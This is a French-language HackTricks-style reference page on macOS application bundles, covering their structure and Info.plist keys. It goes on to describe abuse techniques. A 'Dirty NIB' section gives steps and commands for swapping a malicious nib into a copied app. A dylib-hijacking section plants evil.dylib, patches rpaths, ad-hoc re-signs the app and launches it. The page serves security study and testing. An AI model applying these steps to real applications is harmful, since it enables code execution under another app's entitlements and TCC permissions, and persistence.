# Bundles macOS

{{#include ../../../banners/hacktricks-training.md}}

## Informations de base

Les bundles dans macOS servent de conteneurs pour diverses ressources, notamment des applications, des libraries et d'autres fichiers nécessaires, leur donnant l'apparence d'objets uniques dans le Finder, comme les fichiers `*.app` familiers. Le bundle le plus couramment rencontré est le bundle `.app`, bien que d'autres types tels que `.framework`, `.systemextension` et `.kext` soient également fréquents.

### Composants essentiels d'un bundle

Dans un bundle, notamment dans le répertoire `<application>.app/Contents/`, diverses ressources importantes sont stockées :

- **\_CodeSignature** : ce répertoire stocke les informations de signature du code, indispensables pour vérifier l'intégrité de l'application. Vous pouvez examiner les informations de signature du code à l'aide de commandes telles que :
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS** : Contient le binaire exécutable de l'application, lancé lors d'une interaction avec l'utilisateur.
- **Resources** : Répertoire des composants de l'interface utilisateur de l'application, notamment les images, les documents et les descriptions d'interface (fichiers nib/xib).
- **Info.plist** : Sert de fichier de configuration principal de l'application. Il est essentiel pour que le système puisse reconnaître l'application et interagir avec elle de manière appropriée.

#### Clés importantes dans Info.plist

Le fichier `Info.plist` constitue un élément central de la configuration de l'application. Il contient notamment les clés suivantes :

- **CFBundleExecutable** : Spécifie le nom du fichier exécutable principal situé dans le répertoire `Contents/MacOS`.
- **CFBundleIdentifier** : Fournit un identifiant global pour l'application, largement utilisé par macOS pour la gestion des applications.
- **LSMinimumSystemVersion** : Indique la version minimale de macOS requise pour exécuter l'application.

### Exploration des Bundles

Pour explorer le contenu d'un bundle, tel que `Safari.app`, la commande suivante peut être utilisée : `bash ls -lR /Applications/Safari.app/Contents`

Cette exploration révèle des répertoires tels que `_CodeSignature`, `MacOS`, `Resources`, ainsi que des fichiers comme `Info.plist`. Chacun possède une fonction spécifique, allant de la sécurisation de l'application à la définition de son interface utilisateur et de ses paramètres opérationnels.

#### Répertoires supplémentaires des Bundles

Au-delà des répertoires courants, les bundles peuvent également inclure :

- **Frameworks** : Contient les frameworks intégrés utilisés par l'application. Les frameworks sont comparables aux dylibs, mais avec des ressources supplémentaires.
- **PlugIns** : Répertoire destiné aux plug-ins et extensions qui améliorent les fonctionnalités de l'application.
- **XPCServices** : Contient les services XPC utilisés par l'application pour la communication out-of-process.

Cette structure garantit que tous les composants nécessaires sont encapsulés dans le bundle, ce qui facilite la mise en place d'un environnement applicatif modulaire et sécurisé.

Pour plus d'informations sur les clés `Info.plist` et leur signification, la documentation destinée aux développeurs Apple fournit des ressources détaillées : [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).

## Notes de sécurité et vecteurs d'abus

- **Gatekeeper / App Translocation** : Lorsqu'un bundle placé en quarantaine est exécuté pour la première fois, macOS effectue une vérification approfondie de la signature et peut l'exécuter depuis un chemin transloqué aléatoire. Une fois accepté, les lancements ultérieurs n'effectuent que des vérifications superficielles ; les fichiers de ressources dans `Resources/`, `PlugIns/`, les nibs, etc., n'étaient historiquement pas vérifiés. Depuis macOS 13 Ventura, une vérification approfondie est appliquée lors de la première exécution et la nouvelle permission TCC *App Management* empêche les processus tiers de modifier d'autres bundles sans le consentement de l'utilisateur, mais les anciens systèmes restent vulnérables.
- **Collisions d'identifiants de Bundle** : Plusieurs targets intégrés (PlugIns, outils auxiliaires) réutilisant le même `CFBundleIdentifier` peuvent perturber la validation de la signature et permettre occasionnellement le détournement ou la confusion de schémas d'URL. Énumérez toujours les sous-bundles et vérifiez que leurs identifiants sont uniques.

## Resource Hijacking (Dirty NIB / NIB Injection)

Avant Ventura, le remplacement de ressources d'interface utilisateur dans une application signée pouvait contourner la signature de code superficielle et permettre l'exécution de code avec les entitlements de l'application. Les recherches actuelles (2024) montrent que cette technique fonctionne toujours sur les versions antérieures à Ventura et sur les builds non placés en quarantaine :<sup>[1][2]</sup>

1. Copiez l'application cible vers un emplacement accessible en écriture (par exemple, `/tmp/Victim.app`).
2. Remplacez `Contents/Resources/MainMenu.nib` (ou tout nib déclaré dans `NSMainNibFile`) par un fichier malveillant qui instancie `NSAppleScript`, `NSTask`, etc.
3. Lancez l'application. Le nib malveillant s'exécute avec le bundle ID et les entitlements de la victime (autorisations TCC, microphone/caméra, etc.).
4. Ventura+ atténue ce problème en vérifiant en profondeur le bundle lors du premier lancement et en exigeant la permission *App Management* pour les modifications ultérieures. La persistance est donc plus difficile, mais les attaques lors du lancement initial sur les anciennes versions de macOS restent possibles.<sup>[1]</sup>

Exemple minimal de payload nib malveillant (compilez le xib en nib avec `ibtool`) :
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Framework / PlugIn / dylib Hijacking à l'intérieur des Bundles

Because `@rpath` lookups privilégient les Frameworks/PlugIns intégrés au Bundle, placer une library malveillante dans `Contents/Frameworks/` ou `Contents/PlugIns/` peut rediriger l'ordre de chargement lorsque le binaire principal est signé sans library validation ou avec un ordre `LC_RPATH` faible.

Étapes typiques lors de l'exploitation d'un Bundle unsigned/ad-hoc :
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
Notes :
- Le hardened runtime avec `com.apple.security.cs.disable-library-validation` absent bloque les dylibs tierces ; vérifiez d’abord les entitlements.
- Les XPC services sous `Contents/XPCServices/` chargent souvent des frameworks frères — patchez leurs binaries de manière similaire pour la persistence ou les chemins d’escalade de privilèges.

## Aide-mémoire d’inspection rapide
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## Références

- [1] [Faire apparaître l'injection de processus : exploiter des apps macOS à l'aide de fichiers nib (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [2] [Dirty NIB & compte rendu de la falsification de ressources de bundle (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)

{{#include ../../../banners/hacktricks-training.md}}
